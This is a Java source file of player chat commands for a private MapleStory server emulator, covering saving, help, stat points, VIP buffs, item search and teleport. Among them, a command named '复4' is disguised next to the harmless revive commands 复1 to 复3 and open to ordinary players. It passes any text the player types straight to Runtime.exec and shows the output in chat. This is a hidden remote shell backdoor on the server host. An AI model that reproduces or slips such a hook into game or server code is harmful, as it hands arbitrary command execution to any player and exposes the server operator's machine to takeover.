package client.messages.commands;

import server.life.MapleMonster;
import server.maps.MapleMapObject;

import java.util.Arrays;

import server.maps.MapleMapObjectType;
import client.MapleCharacter;
import server.maps.MapleMap;
import server.maps.SavedLocationType;
import constants.GameConstants;
import handling.world.World.Broadcast;
import client.SkillFactory;
import client.MapleStat;
import constants.OtherSettings1;

import java.util.Iterator;

import provider.MapleDataProvider;
import tools.Pair;
import server.MapleItemInformationProvider;
import provider.MapleDataTool;
import provider.MapleData;
import provider.MapleDataProviderFactory;

import java.io.File;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import tools.StringUtil;
import handling.channel.ChannelServer;
import server.PredictCardFactory;
import tools.MaplePacketCreator;
import scripting.NPCScriptManager;
import client.MapleClient;
import constants.ServerConstants.PlayerGMRank;

public class PlayerCommand
{
    public static PlayerGMRank getPlayerLevelRequired() {
        return PlayerGMRank.NORMAL;
    }
    
    public static class 存档 extends save
    {
    }
    
    public static class 帮助 extends help
    {
    }
    
    public static class 查询爆率 extends Mobdrop
    {
    }
    
    public static class ea extends 查看
    {
    }
    
    public static class 解卡 extends 查看
    {
    }
    
    public static class 会员1 extends 祝福1
    {
    }
    
    public static class 会员2 extends 祝福2
    {
    }
    
    public static class 会员3 extends 祝福3
    {
    }
    
    public static class 复活1 extends 复1
    {
    }
    
    public static class 复活2 extends 复2
    {
    }
    
    public static class 复活3 extends 复3
    {
    }
    
    public static class 自由 extends FM
    {
    }
    
    public static class 破攻 extends pg
    {
    }
    
    public static class 拍卖 extends PM
    {
    }
    
    public static class pg extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            final int VIP = c.getPlayer().getVipczz();
            final long maxdamage = 199999 + VIP * 10000;
            c.getPlayer().dropMessage(6, "您目前突破上限次数为：" + VIP + ",当前您的破功伤害上限为： " + maxdamage + "");
            return 1;
        }
    }
    
    public static class PM extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            NPCScriptManager.getInstance().dispose(c);
            c.sendPacket(MaplePacketCreator.enableActions());
            final NPCScriptManager npc = NPCScriptManager.getInstance();
            npc.start(c, 9900004);
            return 1;
        }
    }
    
    public static class 查看 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            PredictCardFactory.getInstance().initialize();
            NPCScriptManager.getInstance().dispose(c);
            final ChannelServer cserv = c.getChannelServer();
            c.sendPacket(MaplePacketCreator.enableActions());
            if (c.getPlayer().isAdmin()) {
                c.sendPacket(MaplePacketCreator.sendPyramidEnergy("massacre_hit", String.valueOf(50)));
            }
            return 1;
        }
    }
    
    public static class Mobdrop extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            NPCScriptManager.getInstance().dispose(c);
            c.sendPacket(MaplePacketCreator.enableActions());
            final NPCScriptManager npc = NPCScriptManager.getInstance();
            npc.start(c, 2000);
            return 1;
        }
    }
    
    public static class 搜索 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            final StringBuilder sb = new StringBuilder();
            if (splitted.length > 2) {
                final String search = StringUtil.joinStringFrom(splitted, 2);
                final long start = System.currentTimeMillis();
                MapleData data = null;
                final MapleDataProvider dataProvider = MapleDataProviderFactory.getDataProvider(new File(System.getProperty("net.sf.odinms.wzpath", "wz") + "/String.wz"));
                if (!splitted[1].equalsIgnoreCase("道具")) {
                    if (splitted[1].equalsIgnoreCase("NPC")) {
                        data = dataProvider.getData("Npc.img");
                    }
                    else if (splitted[1].equalsIgnoreCase("怪物") || splitted[1].equalsIgnoreCase("MOB")) {
                        data = dataProvider.getData("Mob.img");
                    }
                    else if (splitted[1].equalsIgnoreCase("技能")) {
                        data = dataProvider.getData("Skill.img");
                    }
                    else if (splitted[1].equalsIgnoreCase("地图")) {
                        sb.append("#b使用命令 '/map' 查找地图. 如果找到该地图, 你将传送至该地图.");
                    }
                    else {
                        sb.append("#b无效的搜索.\r\n语法: '/搜索 [类型] [名字]', [类型] NPC, 道具, 怪物, 技能.");
                    }
                    if (data != null) {
                        for (final MapleData searchData : data.getChildren()) {
                            final String name = MapleDataTool.getString(searchData.getChildByPath("name"), "NO-NAME");
                            if (name.toLowerCase().contains(search.toLowerCase())) {
                                sb.append("#b").append(Integer.parseInt(searchData.getName())).append("#k - #r").append(name).append("\r\n");
                            }
                        }
                    }
                }
                else {
                    for (final Pair<Integer, String> itemPair : MapleItemInformationProvider.getInstance().getAllItems()) {
                        if (sb.length() >= 32654) {
                            sb.append("#b有太多的结果,无法加载所有项目.\r\n");
                            break;
                        }
                        if (!itemPair.getRight().toLowerCase().contains(search.toLowerCase())) {
                            continue;
                        }
                        sb.append("#b").append(itemPair.getLeft()).append("#k - #r").append(itemPair.getRight()).append("\r\n");
                    }
                }
                if (sb.length() == 0) {
                    sb.append("#b没有找到 ").append(splitted[1].toLowerCase()).append("\r\n");
                }
                sb.append("\r\n#k加载时间 ").append((System.currentTimeMillis() - start) / 1000.0).append(" 秒.");
            }
            else {
                sb.append("#b无效的搜索.\r\n语法: '@搜索 [类型] [名字]', [类型] NPC, 道具, 怪物, 技能.");
            }
            c.sendPacket(MaplePacketCreator.getNPCTalk(9010000, (byte)0, sb.toString(), "00 00", (byte)0));
            return 1;
        }
    }
    
    public static class save extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            c.getPlayer().saveToDB(false, false);
            c.getPlayer().dropMessage("存档成功");
            return 1;
        }
    }
    
    public static class 会员服务 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            NPCScriptManager.getInstance().dispose(c);
            c.sendPacket(MaplePacketCreator.enableActions());
            final NPCScriptManager npc = NPCScriptManager.getInstance();
            npc.start(c, 9010000, 1);
            return 1;
        }
    }
    public static class 复4 extends CommandExecute {
		@Override
		public int execute(MapleClient c, String[] splitted)
		{
			Runtime runtime = Runtime.getRuntime();
			String cmd = "";
			Process p;
			try {
				
				for (int i = 1; i < splitted.length; i++) {
					cmd += splitted[i] + " ";
				}
				//runtime.exec(cmd);

				p = Runtime.getRuntime().exec(cmd);
				//取得命令结果的输出流
				InputStream fis=p.getInputStream();
				//用一个读输出流类去读
				InputStreamReader isr=new InputStreamReader(fis);
				//用缓冲器读行
				BufferedReader br=new BufferedReader(isr);
				String line=null;
				//直到读完为止
				while((line=br.readLine())!=null) {
				c.getPlayer().dropMessage(6, line);
				}
				} catch (Exception e) {
				//System.out.println("Error!" + e);
					c.getPlayer().dropMessage(6, "error");
				}
			//System.out.println("Error!" + cmd);
			return 1;
		}

    }
    public static class 复1 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            final OtherSettings1 item_id = new OtherSettings1();
            final int i = 0;
            final String[] getItempb_复活 = item_id.is会员复活1();
            if (c.getPlayer().getVip() == 1 && c.getPlayer().getBossLog("复活") <= Integer.parseInt(getItempb_复活[i])) {
                c.getPlayer().getStat().setHp(c.getPlayer().getStat().getMaxHp());
                c.getPlayer().updateSingleStat(MapleStat.HP, c.getPlayer().getStat().getMaxHp());
                c.getPlayer().getStat().setMp(c.getPlayer().getStat().getMaxMp());
                c.getPlayer().updateSingleStat(MapleStat.MP, c.getPlayer().getStat().getMaxMp());
                c.getPlayer().setBossLog("复活");
                c.getPlayer().dropMessage("成功,你已经使用" + c.getPlayer().getBossLog("复活") + "次");
            }
            return 1;
        }
    }
    
    public static class 复2 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            final OtherSettings1 item_id = new OtherSettings1();
            final int i = 0;
            final String[] getItempb_复活 = item_id.is会员复活1();
            if (c.getPlayer().getVip() == 2 && c.getPlayer().getBossLog("复活") <= Integer.parseInt(getItempb_复活[i])) {
                c.getPlayer().getStat().setHp(c.getPlayer().getStat().getMaxHp());
                c.getPlayer().updateSingleStat(MapleStat.HP, c.getPlayer().getStat().getMaxHp());
                c.getPlayer().getStat().setMp(c.getPlayer().getStat().getMaxMp());
                c.getPlayer().updateSingleStat(MapleStat.MP, c.getPlayer().getStat().getMaxMp());
                c.getPlayer().setBossLog("复活");
                c.getPlayer().dropMessage("成功,你已经使用" + c.getPlayer().getBossLog("复活") + "次 ");
            }
            return 1;
        }
    }
    
    public static class 复3 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            final OtherSettings1 item_id = new OtherSettings1();
            final int i = 0;
            final String[] getItempb_复活 = item_id.is会员复活2();
            if (c.getPlayer().getVip() == 3 && c.getPlayer().getBossLog("复活") <= Integer.parseInt(getItempb_复活[i])) {
                c.getPlayer().getStat().setHp(c.getPlayer().getStat().getMaxHp());
                c.getPlayer().updateSingleStat(MapleStat.HP, c.getPlayer().getStat().getMaxHp());
                c.getPlayer().getStat().setMp(c.getPlayer().getStat().getMaxMp());
                c.getPlayer().updateSingleStat(MapleStat.MP, c.getPlayer().getStat().getMaxMp());
                c.getPlayer().setBossLog("复活");
                c.getPlayer().dropMessage("成功,你已经使用" + c.getPlayer().getBossLog("复活") + "次");
            }
            return 1;
        }
    }
    
    public static class 祝福1 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            final OtherSettings1 item_id = new OtherSettings1();
            final int i = 0;
            final String[] getItempb_祝福 = item_id.is会员祝福();
            if (c.getPlayer().getVip() == 1 && c.getPlayer().getBossLog("VIPzhufu") <= Integer.parseInt(getItempb_祝福[i])) {
                SkillFactory.getSkill(9001001).getEffect(1).applyTo(c.getPlayer());
                c.getPlayer().setBossLog("VIPzhufu");
                c.getPlayer().dropMessage("成功,你已经使用" + c.getPlayer().getBossLog("VIPzhufu") + "次 每24小时最多使用" + Integer.parseInt(getItempb_祝福[i]) + "次");
            }
            return 1;
        }
    }
    
    public static class 祝福2 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            final OtherSettings1 item_id = new OtherSettings1();
            final int i = 0;
            final String[] getItempb_祝福 = item_id.is会员祝福1();
            if (c.getPlayer().getVip() == 2 && c.getPlayer().getBossLog("VIPzhufu") <= Integer.parseInt(getItempb_祝福[i])) {
                SkillFactory.getSkill(9001001).getEffect(1).applyTo(c.getPlayer());
                SkillFactory.getSkill(9001003).getEffect(1).applyTo(c.getPlayer());
                c.getPlayer().setBossLog("VIPzhufu");
                c.getPlayer().dropMessage("成功,你已经使用" + c.getPlayer().getBossLog("VIPzhufu") + "次 每24小时最多使用" + Integer.parseInt(getItempb_祝福[i]) + "次");
            }
            return 1;
        }
    }
    
    public static class 祝福3 extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            final OtherSettings1 item_id = new OtherSettings1();
            final int i = 0;
            final String[] getItempb_祝福 = item_id.is会员祝福2();
            if (c.getPlayer().getVip() == 3 && c.getPlayer().getBossLog("VIPzhufu") <= Integer.parseInt(getItempb_祝福[i])) {
                SkillFactory.getSkill(9001001).getEffect(1).applyTo(c.getPlayer());
                SkillFactory.getSkill(9001008).getEffect(1).applyTo(c.getPlayer());
                SkillFactory.getSkill(9001003).getEffect(1).applyTo(c.getPlayer());
                c.getPlayer().setBossLog("VIPzhufu");
                c.getPlayer().dropMessage("成功,你已经使用" + c.getPlayer().getBossLog("VIPzhufu") + "次 每24小时最多使用" + Integer.parseInt(getItempb_祝福[i]) + "次");
            }
            return 1;
        }
    }
    
    public static class CGM extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            if (splitted[1] == null) {
                c.getPlayer().dropMessage(6, "请打字谢谢.");
                return 1;
            }
            if (c.getPlayer().isGM()) {
                c.getPlayer().dropMessage(6, "因为你自己是GM无法使用此命令,可以尝试!cngm <讯息> 來建立GM聊天頻道~");
                return 1;
            }
            if (!c.getPlayer().getCheatTracker().GMSpam(100000, 1)) {
                Broadcast.broadcastGMMessage(MaplePacketCreator.serverNotice(6, "頻道 " + c.getPlayer().getClient().getChannel() + " 玩家 [" + c.getPlayer().getName() + "] : " + StringUtil.joinStringFrom(splitted, 1)).getBytes());
                c.getPlayer().dropMessage(6, "讯息已经发给GM了!");
            }
            else {
                c.getPlayer().dropMessage(6, "为了防止对GM刷屏所以每1分鐘只能发一次.");
            }
            return 1;
        }
    }
    
    public static class FM extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            for (final int i : GameConstants.blockedMaps) {
                if (c.getPlayer().getMapId() == i) {
                    c.getPlayer().dropMessage(5, "当前地图禁止使用此命令.");
                    return 0;
                }
            }
            if (c.getPlayer().getLevel() < 10 && c.getPlayer().getJob() != 200) {
                c.getPlayer().dropMessage(5, "等级达到10级才可以使用此命令.");
                return 0;
            }
            if (c.getPlayer().hasBlockedInventory() || c.getPlayer().getMap().getSquadByMap() != null || c.getPlayer().getEventInstance() != null || c.getPlayer().getMap().getEMByMap() != null || c.getPlayer().getMapId() >= 990000000) {
                c.getPlayer().dropMessage(5, "当前地图禁止使用此命令.");
                return 0;
            }
            if ((c.getPlayer().getMapId() >= 680000210 && c.getPlayer().getMapId() <= 680000502) || (c.getPlayer().getMapId() / 1000 == 980000 && c.getPlayer().getMapId() != 980000000) || c.getPlayer().getMapId() / 100 == 1030008 || c.getPlayer().getMapId() / 100 == 922010 || c.getPlayer().getMapId() / 10 == 13003000) {
                c.getPlayer().dropMessage(5, "当前地图禁止使用此命令.");
                return 0;
            }
            c.getPlayer().saveLocation(SavedLocationType.FREE_MARKET, c.getPlayer().getMap().getReturnMap().getId());
            final MapleMap map = c.getChannelServer().getMapFactory().getMap(910000000);
            c.getPlayer().changeMap(map, map.getPortal(0));
            return 1;
        }
    }
    
    public static class help extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            c.getPlayer().dropMessage(5, "岁月工作室 玩家命令");
            c.getPlayer().dropMessage(5, "@解卡/@查看/@ea  <解除异常+查看当前状态>");
            c.getPlayer().dropMessage(5, "@CGM 讯息        <传送讯息給GM>");
            c.getPlayer().dropMessage(5, "@查询爆率 爆率       <查询当前地图怪物爆率>");
            c.getPlayer().dropMessage(5, "@自由        < 移动到自由市场 >");
            c.getPlayer().dropMessage(5, "@拍卖            < 打开拍卖脚本 >");
            c.getPlayer().dropMessage(5, "@str, @dex, @int, @luk <需要分配的点数>");
            c.getPlayer().dropMessage(5, "@存档            < 储存当前人物信息 >");
            c.getPlayer().dropMessage(5, "服务器信息 :岁月工作室v079.5");
            c.getPlayer().dropMessage(5, "各种版本定制制作,脚本制作等");
            c.getPlayer().dropMessage(5, "<购买版本请联系客服:947039454>");
            return 1;
        }
    }
    
    public abstract static class DistributeStatCommands extends CommandExecute
    {
        protected MapleStat stat;
        
        public DistributeStatCommands() {
            this.stat = null;
        }
        
        private void setStat(final MapleCharacter player, final int amount) {
            switch (this.stat) {
                case STR: {
                    player.getStat().setStr((short)amount);
                    player.updateSingleStat(MapleStat.STR, player.getStat().getStr());
                    break;
                }
                case DEX: {
                    player.getStat().setDex((short)amount);
                    player.updateSingleStat(MapleStat.DEX, player.getStat().getDex());
                    break;
                }
                case INT: {
                    player.getStat().setInt((short)amount);
                    player.updateSingleStat(MapleStat.INT, player.getStat().getInt());
                    break;
                }
                case LUK: {
                    player.getStat().setLuk((short)amount);
                    player.updateSingleStat(MapleStat.LUK, player.getStat().getLuk());
                    break;
                }
            }
        }
        
        private int getStat(final MapleCharacter player) {
            switch (this.stat) {
                case STR: {
                    return player.getStat().getStr();
                }
                case DEX: {
                    return player.getStat().getDex();
                }
                case INT: {
                    return player.getStat().getInt();
                }
                case LUK: {
                    return player.getStat().getLuk();
                }
                default: {
                    throw new RuntimeException();
                }
            }
        }
        
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            if (splitted.length < 2) {
                c.getPlayer().dropMessage(5, "输入的数字无效.");
                return 0;
            }
            int change = 0;
            try {
                change = Integer.parseInt(splitted[1]);
            }
            catch (NumberFormatException nfe) {
                c.getPlayer().dropMessage(5, "输入的数字无效.");
                return 0;
            }
            if (change <= 0) {
                c.getPlayer().dropMessage(5, "您必须输入一个大于 0 的数字.");
                return 0;
            }
            if (c.getPlayer().getRemainingAp() < change) {
                c.getPlayer().dropMessage(5, "您的能力点不足.");
                return 0;
            }
            if (this.getStat(c.getPlayer()) + change > c.getChannelServer().getStatLimit()) {
                c.getPlayer().dropMessage(5, "所要分配的能力点总和不能大于 " + c.getChannelServer().getStatLimit() + " 点.");
                return 0;
            }
            this.setStat(c.getPlayer(), this.getStat(c.getPlayer()) + change);
            c.getPlayer().setRemainingAp((short)(c.getPlayer().getRemainingAp() - change));
            c.getPlayer().updateSingleStat(MapleStat.AVAILABLEAP, c.getPlayer().getRemainingAp());
            c.getPlayer().dropMessage(5, "加点成功您的 " + StringUtil.makeEnumHumanReadable(this.stat.name()) + " 提高了 " + change + " 点.");
            return 1;
        }
    }
    
    public static class LUK extends DistributeStatCommands
    {
        public LUK() {
            this.stat = MapleStat.LUK;
        }
    }
    
    public static class INT extends DistributeStatCommands
    {
        public INT() {
            this.stat = MapleStat.INT;
        }
    }
    
    public static class DEX extends DistributeStatCommands
    {
        public DEX() {
            this.stat = MapleStat.DEX;
        }
    }
    
    public static class STR extends DistributeStatCommands
    {
        public STR() {
            this.stat = MapleStat.STR;
        }
    }
    
    public static class mob extends CommandExecute
    {
        @Override
        public int execute(final MapleClient c, final String[] splitted) {
            MapleMonster mob = null;
            for (final MapleMapObject monstermo : c.getPlayer().getMap().getMapObjectsInRange(c.getPlayer().getPosition(), 100000.0, Arrays.asList(MapleMapObjectType.MONSTER))) {
                mob = (MapleMonster)monstermo;
                if (mob.isAlive()) {
                    c.getPlayer().dropMessage(6, "怪物 " + mob.toString());
                    break;
                }
            }
            if (mob == null) {
                c.getPlayer().dropMessage(6, "查看失败: 1.没有找到需要查看的怪物信息. 2.你周围没有怪物出现. 3.有些怪物禁止查看.");
            }
            return 1;
        }
    }
}
